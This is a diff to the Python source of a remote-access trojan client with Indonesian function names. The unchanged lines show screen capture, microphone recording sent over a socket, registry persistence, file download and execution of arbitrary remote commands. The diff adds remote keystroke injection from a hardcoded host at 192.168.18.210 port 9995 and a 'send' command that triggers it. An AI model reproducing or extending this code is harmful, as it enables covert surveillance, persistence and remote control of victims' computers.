@@ -16,8 +16,32 @@ from PIL import ImageGrab
 import numpy as np
 import shutil
 import pyaudio
+from pynput.keyboard import Key, Controller
 
 sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+keyb = Controller()
+def acc_keystroke():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect(('192.168.18.210', 9995))
+        while True:
+            data = s.recv(1024)
+            if not data:
+                break
+            command = data.decode()
+            try:
+                if command.lower() == 'enter':
+                    keyb.press(Key.enter)
+                    keyb.release(Key.enter)
+                if command.lower() == 'space':
+                    keyb.press(Key.space)
+                    keyb.release(Key.space)
+                else:
+                    keyb.type(command)
+            except Exception as e:
+                print(f'{e}')
+                break
+            
 
 FORMAT = pyaudio.paInt16
 CHANNEL = 1
@@ -45,7 +69,7 @@ def record_n_send():
         stream.stop_stream()
         stream.close()
         audio.terminate()
-        
+
 def  execute_persistence(nama_registry, file_exe):
     file_path = os.environ['appdata']+'\\'+file_exe
     try:
@@ -103,11 +127,11 @@ def log_thread():
 def download_file(namafile):
     file = open(namafile, 'wb')
     sok.settimeout(1)
-    _file = sok.recv(4096)
+    _file = sok.recv(100000)
     while _file:
         file.write(_file)
         try:
-            _file = sok.recv(4096)
+            _file = sok.recv(100000)
         except socket.timeout as e:
             break
     sok.settimeout(None)
@@ -161,6 +185,10 @@ def jalankan_perintah():
             pass
         elif perintah == 'rec_audio':
             record_n_send()
+        elif perintah == 'banner':
+            pass
+        elif perintah == 'send':
+            acc_keystroke()
         else:
             exe = subprocess.Popen(
             perintah,
@@ -185,4 +213,4 @@ def execute_persist():
         except:
             execute_persist()
 
-execute_persist()
+execute_persist() 
